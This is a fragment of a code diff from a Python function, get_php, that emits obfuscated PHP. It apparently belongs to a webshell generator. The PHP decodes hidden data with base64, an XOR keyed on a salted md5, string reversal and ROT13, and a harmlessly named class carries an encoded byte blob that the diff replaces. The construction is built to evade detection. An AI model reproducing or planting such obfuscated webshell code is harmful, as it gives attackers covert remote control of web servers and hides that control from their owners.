@@ -3,7 +3,7 @@ def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
 function dept($data,$salt="%s",$change=0x80){$data=base64_decode($data);$saltm = md5($salt);$len = strlen($data);$pass=strrev(str_rot13(substr(strrev($data^str_repeat($saltm,ceil($len / 32)) ^ str_repeat(chr($change),$len)),0,-32)));return $pass;}
 
 class replace {
-    private $hash = "\\xab\\xa8\\xa9\\x00\\xc2\\x78\\x77\\xd7\\x90\\x9a\\x00\\xff\\xe0\\x90\\x1a\\x67\\x7f\\x7f\\x6f\\x4f\\xd7\\x1a\\x95\\xbc\\xc4\\xdc\\x54\\x5b\\x95\\xf8\\x60\\xd7\\xa0\\x30\\xd7\\xa0\\x68\\x00\\x8b\\x07\\x00";
+    private $hash = "\\xab\\xa8\\xa9\\x00\\xc2\\x78\\x77\\xd7\\x90\\x9a\\xf8\\x00\\xff\\x60\\x20\\xe9\\xec\\xef\\xef\\xed\\xe9\\x5a\\xa3\\x92\\x97\\x98\\x9b\\x6a\\xab\\x12\\x1f\\xec\\x1a\\x14\\xe6\\x1a\\x14\\x0d\\x00\\x8b\\x07\\x00";
     function __construct($var, $srcname, $array = null)
     {
         $this->var = $var;
